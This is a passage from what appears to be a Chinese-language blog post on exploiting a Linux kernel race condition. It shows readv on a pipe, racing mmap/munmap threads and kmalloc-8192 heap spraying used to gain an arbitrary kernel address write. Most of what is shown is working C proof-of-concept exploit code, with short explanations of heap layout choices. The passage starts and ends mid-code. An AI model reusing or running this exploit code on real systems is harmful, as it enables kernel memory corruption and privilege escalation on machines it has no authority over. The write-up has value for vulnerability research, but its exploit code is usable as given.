<span class="keyword">volatile</span> <span class="keyword">int</span> kill_switch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> overflowcheck = MEMMAGIC;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">readpipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        readv(pipe_fd[<span class="number">0</span>], pipe_iovec, ((IOVECS / <span class="number">2</span>) + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;readpipe exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writepipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], wbuf, <span class="keyword">sizeof</span>(wbuf));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;writepipe exit\n&quot;</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">mapunmap</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        munmap(MMAP_ADDR, MMAP_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mapunmap exit\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">settings</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = getrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;getrlimit()&quot;</span>);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    <span class="keyword">if</span>((ret = setrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;setrlimit()&quot;</span>);          <span class="comment">// setfdlimit, 将能打开的文件描述数量开到最大</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change fd limit from %lu to %lu\n&quot;</span>, rlim.rlim_cur, rlim.rlim_max);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>((ret = setpriority(PRIO_PROCESS, <span class="number">0</span>, <span class="number">-20</span>)) == <span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;setpriority()&quot;</span>);        <span class="comment">// setprocesspriority, 设置当前进程的优先级为最高    </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change process priority to highest: %d\n&quot;</span>, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> test_val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>* target_addr = &amp;test_val;                <span class="comment">// 待写的目标地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> targetval = <span class="number">0x33bbccddeeff</span>;            <span class="comment">// 待写的值</span></span><br><span class="line"></span><br><span class="line">    settings();                </span><br><span class="line"></span><br><span class="line"><span class="comment">// getpipes                        // 创建管道，并将其大小设置为 32*4096，防止读pipe时被阻塞</span></span><br><span class="line">    <span class="keyword">if</span>((ret = pipe(pipe_fd))) err(<span class="number">1</span>, <span class="string">&quot;pipe()&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fcntl(pipe_fd[<span class="number">1</span>], F_SETPIPE_SZ, PIPESZ) != PIPESZ) err(<span class="number">1</span>, <span class="string">&quot;fcntl()&quot;</span>);          </span><br><span class="line"></span><br><span class="line"><span class="comment">// mmap unmap addr</span></span><br><span class="line">    <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="number">1</span>, <span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line"><span class="comment">// pipe readv iovec</span></span><br><span class="line">    pipe_iovec = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct iovec) * IOVEC_NUM);</span><br><span class="line">    <span class="built_in">memset</span>(pipe_iovec, <span class="number">0</span>, <span class="keyword">sizeof</span>(pipe_iovec));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r_buf[<span class="number">2</span>];</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;           <span class="comment">//just any buffer that is always available</span></span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;         <span class="comment">//how many bytes we can arbitrary write</span></span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);          <span class="comment">//we need more than one pipe buf so make a total of 2 pipe bufs (8192 bytes)</span></span><br><span class="line">    pipe_iovec[(IOVECS / <span class="number">2</span>) - <span class="number">2</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    pipe_iovec[(IOVECS / <span class="number">2</span>) - <span class="number">2</span>].iov_len = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    pipe_iovec[(IOVECS / <span class="number">2</span>) - <span class="number">1</span>].iov_base = target_addr;</span><br><span class="line">    pipe_iovec[(IOVECS / <span class="number">2</span>) - <span class="number">1</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"><span class="comment">// three thread race condition</span></span><br><span class="line">    <span class="keyword">pthread_t</span> mapthread, wthread, rthread;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start map/unmap thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;mapthread, <span class="literal">NULL</span>, mapunmap, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;mapunmap pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start write thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(wbuf) / <span class="keyword">sizeof</span>(targetval)); i++)</span><br><span class="line">        ((<span class="keyword">long</span>*)wbuf)[i] = targetval;</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;wthread, <span class="literal">NULL</span>, writepipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;write pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;    [+] Start read thread\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((ret = pthread_create(&amp;rthread, <span class="literal">NULL</span>, readpipe, <span class="literal">NULL</span>))) err(<span class="number">1</span>, <span class="string">&quot;read pthread_create()&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(overflowcheck != MEMMAGIC)</span><br><span class="line">        &#123;</span><br><span class="line">            kill_switch = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    [+] Done\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;     overflowcheck : 0x%llx, sizeof(overflowcheck): %d \n&quot;</span>, overflowcheck, <span class="keyword">sizeof</span>(overflowcheck));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] done! test_val: 0x%llx\n&quot;</span>, test_val);</span><br><span class="line"></span><br><span class="line">    pthread_join(mapthread,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(wthread,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(rthread,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="往任意内核地址写"   >
          <a href="#往任意内核地址写" class="heading-link"><i class="fas fa-link"></i></a><a href="#往任意内核地址写" class="headerlink" title="往任意内核地址写"></a>往任意内核地址写</h3>
      <p>上一小节是一个验证该漏洞实现任意地址写功能的poc，当前仅能往用户态写。因为使用 readv 传递 pipe_iovec 时，其中的 iov_base 会被检查，要求必须是用户态可访问的地址。</p>
<p>所以，我们需要将目标地址（内核地址）放入 pipe_iovec 在内核中申请的堆块的后面，然后利用越界访问，将后一个堆块中的内核地址作为 iov_base，完成任意地址写。如下构造</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--------heap1-----------</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;        </span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;       </span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);  </span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_len = <span class="number">0</span>;         </span><br><span class="line">    [...]</span><br><span class="line">    pipe_iovec[n].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[n].iov_len = <span class="number">0</span>; </span><br><span class="line">--------heap2-----------</span><br><span class="line">    overun_iovec[<span class="number">0</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    overun_iovec[<span class="number">0</span>].iov_base = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    overun_iovec[<span class="number">1</span>].iov_base = kernel_addr;</span><br><span class="line">    overun_iovec[<span class="number">1</span>].iov_base = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br></pre></td></tr></table></div></figure>
<p>让需要的数据刚好放置在目标堆块的后面，这当然需要使用堆喷技术来布置堆空间。需要考虑几个问题：</p>
<ol>
<li><p>选择合适的堆块大小</p>
<p>首先选择目标堆块的大小，通过 cat /proc/slabinfo 发现 kmalloc-8192 的使用率是最低的，为了减少干扰，优先选择该大小。</p>
</li>
<li><p>使用何种方式布置堆空间</p>
<p>经过测试，有两种方式将 overun_iovec 布置到堆空间：</p>
<ul>
<li><p>第一种，通过堆喷把 overflowcheck 等内容布置到堆头，这样只要heap1和heap2是相邻的两个 kmalloc-8192 就能完成任意地址写。如下布局</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">--------heap1-----------</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;        </span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;       </span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);  </span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_len = <span class="number">0</span>;         </span><br><span class="line">    [...]</span><br><span class="line">    pipe_iovec[<span class="number">511</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">511</span>].iov_len = <span class="number">0</span>; </span><br><span class="line">--------heap2-----------</span><br><span class="line">    overun_iovec[<span class="number">0</span>].iov_base = (<span class="keyword">void</span>*)&amp;overflowcheck;</span><br><span class="line">    overun_iovec[<span class="number">0</span>].iov_base = <span class="keyword">sizeof</span>(overflowcheck);</span><br><span class="line">    overun_iovec[<span class="number">1</span>].iov_base = kernel_addr;</span><br><span class="line">    overun_iovec[<span class="number">1</span>].iov_base = <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    overun_iovec[<span class="number">2</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    overun_iovec[<span class="number">2</span>].iov_len = <span class="number">0</span>;</span><br><span class="line">    [...]</span><br><span class="line">    overun_iovec[<span class="number">511</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    overun_iovec[<span class="number">511</span>].iov_len = <span class="number">0</span>; </span><br></pre></td></tr></table></div></figure></li>
<li><p>第二种，通过堆喷把 overflowcheck 等内容布置到堆中间靠后的部分，然后释放堆块（heap2）。这样只要 readv（heap1） 申请到heap2的同一个 kmalloc-8192 堆块，就可完成任意地址写。如下布局</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--------heap1/heap2-----------</span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_base = r_buf;        </span><br><span class="line">    pipe_iovec[<span class="number">0</span>].iov_len = <span class="keyword">sizeof</span>(<span class="keyword">long</span>) * <span class="number">2</span>;       </span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_base = MMAP_ADDR;</span><br><span class="line">    pipe_iovec[<span class="number">1</span>].iov_len = ((PAGE_SIZE * <span class="number">2</span>) - pipe_iovec[<span class="number">0</span>].iov_len);  </span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">2</span>].iov_len = <span class="number">0</span>;         </span><br><span class="line">    [...]</span><br><span class="line">    pipe_iovec[<span class="number">257</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">257</span>].iov_len = <span class="number">0</span>; </span><br><span class="line">    pipe_iovec[<span class="number">258</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">258</span>].iov_len = <span class="number">0</span>; </span><br><span class="line">    [...]</span><br><span class="line">    pipe_iovec[<span class="number">511</span>].iov_base = <span class="number">0</span>;</span><br><span class="line">    pipe_iovec[<span class="number">511</span>].iov_len = <span class="number">0</span>; </span><br></pre></td></tr></table></div></figure>
<p>要求readv时指定的 iovec 大小为256+1，使其分配到kmalloc-8192。堆喷时指定的大小为512，使其分配的也是kmalloc-8192。</p>
</li>
</ul>
</li>
</ol>
<p>本小节的完整poc如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_NUM 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVECS 512</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">pipe_iovec</span>;</span></span><br><span class="line"><span class="keyword">char</span> wbuf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPESZ (4096 * 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMMAGIC (0xDEADBEEF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_ADDR ((void*)0x40000000)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_SIZE (PAGE_SIZE * 2)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> kill_switch = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> overflowcheck = MEMMAGIC;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UDP_SERVER_PORT (5105)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SENDTHREADS (500)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> stop_send = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> test_val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>* target_addr;                <span class="comment">// 待写的目标地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> targetval;            <span class="comment">// 待写的值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">readpipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        readv(pipe_fd[<span class="number">0</span>], pipe_iovec, ((IOVECS / <span class="number">2</span>) + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;readpipe exit\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">writepipe</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        write(pipe_fd[<span class="number">1</span>], wbuf, <span class="keyword">sizeof</span>(wbuf));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;writepipe exit\n&quot;</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">mapunmap</span><span class="params">(<span class="keyword">void</span>* param)</span></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)param; <span class="comment">/* UNUSED */</span></span><br><span class="line">    <span class="keyword">while</span>(!kill_switch)&#123;</span><br><span class="line">        munmap(MMAP_ADDR, MMAP_SIZE);</span><br><span class="line">        <span class="keyword">if</span>(mmap(MMAP_ADDR, MMAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) == (<span class="keyword">void</span>*)<span class="number">-1</span>) err(<span class="string">&quot;mmap() thread&quot;</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mapunmap exit\n&quot;</span>);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">settings</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> ((ret = getrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;getrlimit()&quot;</span>);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    <span class="keyword">if</span>((ret = setrlimit(RLIMIT_NOFILE, &amp;rlim))) err(<span class="number">1</span>, <span class="string">&quot;setrlimit()&quot;</span>);          <span class="comment">// setfdlimit, 将能打开的文件描述数量开到最大</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Change fd limit from %lu to %lu\n&quot;</span>, rlim.rlim_cur, rlim.rlim_max);</span><br><span 